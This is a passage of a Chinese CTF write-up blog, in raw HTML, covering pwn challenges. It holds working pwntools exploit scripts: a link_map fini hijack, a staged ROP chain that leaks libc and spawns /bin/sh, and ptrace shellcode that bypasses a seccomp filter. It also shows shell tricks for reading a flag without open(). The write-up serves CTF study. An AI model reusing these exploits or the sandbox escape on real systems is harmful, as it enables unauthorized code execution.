class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">0x5625ff3e2000</span>     <span class="number">0x5625ff3e3000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff3e3000</span>     <span class="number">0x5625ff3e4000</span> r-xp     <span class="number">1000</span> <span class="number">1000</span>   /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff3e4000</span>     <span class="number">0x5625ff3e5000</span> r--p     <span class="number">1000</span> <span class="number">2000</span>   /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff3e5000</span>     <span class="number">0x5625ff3e6000</span> r--p     <span class="number">1000</span> <span class="number">2000</span>   /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff3e6000</span>     <span class="number">0x5625ff3e7000</span> rw-p     <span class="number">1000</span> <span class="number">3000</span>   /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff6b3000</span>     <span class="number">0x5625ff6d4000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7f2a72e98000</span>     <span class="number">0x7f2a72f99000</span> rw-p   <span class="number">101000</span> <span class="number">0</span>      [anon_7f2a72e98]</span><br><span class="line">    <span class="number">0x7f2a72f99000</span>     <span class="number">0x7f2a72fbb000</span> r--p    <span class="number">22000</span> <span class="number">0</span>      /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a72fbb000</span>     <span class="number">0x7f2a73133000</span> r-xp   <span class="number">178000</span> <span class="number">22000</span>  /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a73133000</span>     <span class="number">0x7f2a73181000</span> r--p    <span class="number">4e000</span> <span class="number">19</span>a000 /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a73181000</span>     <span class="number">0x7f2a73185000</span> r--p     <span class="number">4000</span> <span class="number">1e7000</span> /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a73185000</span>     <span class="number">0x7f2a73187000</span> rw-p     <span class="number">2000</span> <span class="number">1</span>eb000 /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a73187000</span>     <span class="number">0x7f2a7318d000</span> rw-p     <span class="number">6000</span> <span class="number">0</span>      [anon_7f2a73187]</span><br><span class="line">    <span class="number">0x7f2a7318d000</span>     <span class="number">0x7f2a7318e000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a7318e000</span>     <span class="number">0x7f2a731b1000</span> r-xp    <span class="number">23000</span> <span class="number">1000</span>   /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a731b1000</span>     <span class="number">0x7f2a731b9000</span> r--p     <span class="number">8000</span> <span class="number">24000</span>  /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a731ba000</span>     <span class="number">0x7f2a731bb000</span> r--p     <span class="number">1000</span> <span class="number">2</span>c000  /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a731bb000</span>     <span class="number">0x7f2a731bc000</span> rw-p     <span class="number">1000</span> <span class="number">2</span>d000  /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a731bc000</span>     <span class="number">0x7f2a731bd000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      [anon_7f2a731bc]</span><br><span class="line">    <span class="number">0x7ffed494a000</span>     <span class="number">0x7ffed496b000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br><span class="line">    <span class="number">0x7ffed49f3000</span>     <span class="number">0x7ffed49f7000</span> r--p     <span class="number">4000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffed49f7000</span>     <span class="number">0x7ffed49f9000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> --xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br></pre></td></tr></table></figure><p>也就是说题目中的chunk附近任意读写可以转换为libc/ld任意读写</p><p>考虑到只有一次机会,所以显然是要在无泄漏的情况下完成利用,修改stdout等结构体是行不通的</p><p>此时一个思路就是修改link_map的fini函数,是的函数退出时执行题目给的后门</p><p>一开始想叉了,想直接修改DT_FINI_ARRAY到DT_INIT_ARRAY,然后l_addr修改为9直接进入后门</p><p>但是发现这样会使得找fini_array的时候访问段错误,因为是从9+0x3d88找</p><p>所以最后还是选择修改DT_FINI使其指向0x3d80处,然后DT_FINI_ARRAY修改为NULL,l_addr保持为9</p><p>这样最后就会直接调用后门</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr,content</span>):</span><br><span class="line">    content = <span class="built_in">list</span>(content)</span><br><span class="line">    payload = <span class="string">&quot;@&quot;</span> + p32(addr)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        payload += <span class="string">&#x27;.&#x27;</span> + p8(<span class="built_in">ord</span>(content[i]))</span><br><span class="line">        payload += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(<span class="built_in">str</span>(<span class="number">0x100000</span>))</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(<span class="built_in">str</span>(<span class="number">0x100</span>))</span><br><span class="line">    p.recv()</span><br><span class="line">    payload = write(<span class="number">0x338180</span>,p64(<span class="number">9</span>))</span><br><span class="line">    payload += write(<span class="number">0xa8</span>-<span class="number">8</span>,<span class="string">b&#x27;\x80&#x27;</span>)</span><br><span class="line">    payload += write(<span class="number">0x67</span>,p64(<span class="number">0</span>))</span><br><span class="line">    </span><br><span class="line">    payload += <span class="string">&#x27;q&#x27;</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    binary = <span class="string">&#x27;./main&#x27;</span></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">    context.binary = binary</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(sys.argv) == <span class="number">3</span>):</span><br><span class="line">        p = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process(binary)</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>这都是建立在存在后门的情况下,此外如果没有后门,但同样有system也是能做的</p><p>发现到执行fini函数时,rdi固定为一个指向ld上可读写的段,在此之前现在这个位置写上<code>/bin/sh</code>即可,其他的只需要l_addr修改为system@plt与.init中值的差值即可</p><p>不过对其他更普遍的题而言,没啥太大的借鉴性,毕竟都有任意写的能力了,不如用其他方法</p><h1 id="ez-overflow"><a href="#ez-overflow" class="headerlink" title="ez_overflow"></a>ez_overflow</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_401176(a1, a2, a3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I hear stack overflow is pretty easy?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数十分简单,开头的那个<code>sub_401176</code>用于设置缓冲区没什么好说的</p><p>之后就是一个栈溢出但只能溢出8字节</p><p>第一思路肯定是栈迁移然后再次返回到read处,事实也确实如此</p><p>不过我们一次只能写0x18字节,这其中还包括了下一次需要使用的rbp和保存地址</p><p>因此真正有效的只有8个字节</p><p>那么显然是要多次调用read每次写8个字节,一步步布置rop流</p><p>第一次尝试的时候犯了一个错误,就是如果写完8字节之后直接跳转前往布置下一个8字节,就会因为栈迁移交替使得rbp与rsp靠的太近,从而写这一次rop流时会覆盖call read时保存的返回地址,进而段错误</p><p>解决办法就是每一次写完8个字节后,就将栈抬高到别处去,然后才再次返回到布置rop处,总之就是让rsp与rbp距离远一点</p><p>就是常规的rop加了一点套路</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./ez&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line"><span class="keyword">if</span>(script):</span><br><span class="line">gdb.attach(p, script)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line"><span class="keyword">return</span> process(elf_path)</span><br><span class="line"><span class="keyword">return</span> remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401185</span></span><br><span class="line">leave_ret=<span class="number">0x401208</span></span><br><span class="line">bss1=<span class="number">0x404600</span></span><br><span class="line">bss2=<span class="number">0x404800</span></span><br><span class="line">main_read=<span class="number">0x4011ed</span></span><br><span class="line">ret=<span class="number">0x4010C4</span></span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;easy?\n&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss1)+p64(main_read))</span><br><span class="line">s(<span class="string">b&#x27;/bin/sh\0&#x27;</span>+p64(bss2)+p64(main_read))<span class="comment">#这里binsh写早了,导致之后被覆盖了,但懒得改了</span></span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss1+<span class="number">0x8</span>)+p64(main_read))</span><br><span class="line">s(p64(bss2)+p64(bss2)+p64(main_read))</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss1+<span class="number">0x10</span>)+p64(main_read))</span><br><span class="line">s(p64(pop_rdi_ret)+p64(bss2)+p64(main_read))</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss1+<span class="number">0x18</span>)+p64(main_read))</span><br><span class="line">s(p64(<span class="number">0x403FE8</span>)+p64(bss2)+p64(main_read))</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss1+<span class="number">0x20</span>)+p64(main_read))</span><br><span class="line">s(p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(bss2)+p64(main_read))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss1+<span class="number">0x28</span>)+p64(main_read))</span><br><span class="line">s(p64(<span class="number">0x4011ED</span>)+p64(bss1)+p64(leave_ret))</span><br><span class="line"></span><br><span class="line">read_addr=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address=read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss2+<span class="number">0x58</span>)+p64(main_read))</span><br><span class="line">s(<span class="string">b&#x27;/bin/sh\0&#x27;</span>+p64(bss2)+p64(main_read))</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss2+<span class="number">0x60</span>)+p64(main_read))</span><br><span class="line">s(p64(pop_rdi_ret)+p64(bss2)+p64(main_read))</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss2+<span class="number">0x68</span>)+p64(main_read))</span><br><span class="line">s(p64(bss2+<span class="number">0x50</span>)+p64(bss2)+p64(main_read))</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss2+<span class="number">0x70</span>)+p64(main_read))</span><br><span class="line">s(p64(ret)+p64(bss2)+p64(main_read))</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss2+<span class="number">0x78</span>)+p64(main_read))</span><br><span class="line">s(p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])+p64(bss2)+p64(main_read))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss2+<span class="number">0x28</span>)+p64(main_read))</span><br><span class="line">s(p64(<span class="number">0x4011ED</span>)+p64(bss2+<span class="number">0x50</span>)+p64(leave_ret))</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h1 id="2024羊城杯-hardbox"><a href="#2024羊城杯-hardbox" class="headerlink" title="2024羊城杯-hardbox"></a>2024羊城杯-hardbox</h1><p>注意到沙盒并不是return KILL而是return TRACE</p><p><strong>内核4.8之前</strong></p><p>当追踪器允许系统调用继续执行时，该系统调用不会<strong>重新通过 <code>seccomp</code> 检查</strong>。</p><p>即使追踪器修改了系统调用的参数，这些修改后的参数也不会再被 <code>seccomp</code> 验证。</p><p>这可能导致安全风险，因为修改后的调用可能违反 <code>seccomp</code> 的规则。</p><p><strong>内核4.8的改进</strong></p><p>当追踪器允许一个系统调用继续执行时，系统调用会重新经过 <code>seccomp</code> 的检查。</p><p>所以只需要通过fork一个进程,trace该进程,并设置追踪seccomp,并在触发seccomp时datach即可绕过seccomp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">NR_fork = <span class="number">57</span></span><br><span class="line">NR_ptrace = <span class="number">101</span></span><br><span class="line">NR_wait = <span class="number">61</span></span><br><span class="line">PTRACE_ATTACH = <span class="number">16</span></span><br><span class="line">PTRACE_SETOPTIONS = <span class="number">0x4200</span></span><br><span class="line">PTRACE_O_TRACESECCOMP = <span class="number">0x00000080</span></span><br><span class="line">PTRACE_CONT = <span class="number">7</span></span><br><span class="line">PTRACE_DETACH = <span class="number">17</span></span><br><span class="line">shellcode = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">main:</span></span><br><span class="line"><span class="string">/*fork()*/</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;NR_fork&#125;</span></span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rbx</span></span><br><span class="line"><span class="string">    test rax,rax</span></span><br><span class="line"><span class="string">    jz child_code</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">/*ptrace(PTRACE_ATTACH, pid, NULL, NULL)*/</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    mov rsi,rbx</span></span><br><span class="line"><span class="string">    mov rdi,<span class="subst">&#123;PTRACE_ATTACH&#125;</span></span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;NR_ptrace&#125;</span></span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">/* wait child  */</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;NR_wait&#125;</span></span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">/* ptrace(PTRACE_SETOPTIONS, pid, NULL, PTRACE_O_TRACESECCOMP) */</span></span><br><span class="line"><span class="string">    mov r10,<span class="subst">&#123;PTRACE_O_TRACESECCOMP&#125;</span></span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov rsi,rbx</span></span><br><span class="line"><span class="string">    mov rdi, 0x4200</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;NR_ptrace&#125;</span></span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    js error</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">/* ptrace(PTRACE_CONT, pid, NULL, NULL) */</span></span><br><span class="line"><span class="string">    xor r10,r10</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    mov rsi,rbx</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;PTRACE_CONT&#125;</span>  /* PTRACE_CONT */</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;NR_ptrace&#125;</span></span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    js error</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">/* Wait seccomp  */</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;NR_wait&#125;</span></span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    xor r10,r10</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    mov rsi,rbx</span></span><br><span class="line"><span class="string">    mov rdi,<span class="subst">&#123;PTRACE_DETACH&#125;</span></span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;NR_ptrace&#125;</span></span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    hlt</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>顺便学了个在有shell的情况下不触发open调用拿flag的方法</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> * <span class="comment">#等效ls</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> IFS = <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$line</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span> &lt; flag</span><br><span class="line"><span class="comment">#等效cat flag</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> IFS= <span class="built_in">read</span> -r -n1 char; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Character: <span class="variable">$char</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span> &lt; file.txt</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> IFS= <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Line: <span class="variable">$line</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span> &lt; file.txt</span><br></pre></td></tr></table></figure><p>sh后接文件名会作为shell执行,无论是否有执行权限</p><p>例如<code>sh flag</code>也能读取flag,但会触发open</p><h1 id="2024hitctf-nocontext"><a href="#2024hitctf-nocontext" class="headerlink" title="2024hitctf-nocontext"></a>2024hitctf-nocontext</h1><p>程序并不复杂</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setbuf((FILE *)&amp;dword_0, <span class="number">0LL</span>);</span><br><span class="line">  setbuf((FILE *)&amp;dword_0, <span class="number">0LL</span>);</span><br><span class="line">  setbuf((FILE *)&amp;dword_0, <span class="number">0LL</span>);</span><br><span class="line">  dest = (<span class="type">char</span> *)mmap((<span class="type">void</span> *)<span class="number">0x19260817000</span>LL, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dest == (<span class="type">char</span> *)<span class="number">-1LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;shellcode: &quot;</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, &amp;unk_4020, <span class="number">0xAE</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, dest + <span class="number">174</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">  mprotect(dest, <span class="number">0x1000</span>uLL, <span class="number">5</span>);</span><br><span class="line">  sub_12EF();<span class="comment">//沙盒</span></span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))dest)();</span><br><span class="line">  <span class="keyword">return</span> <span 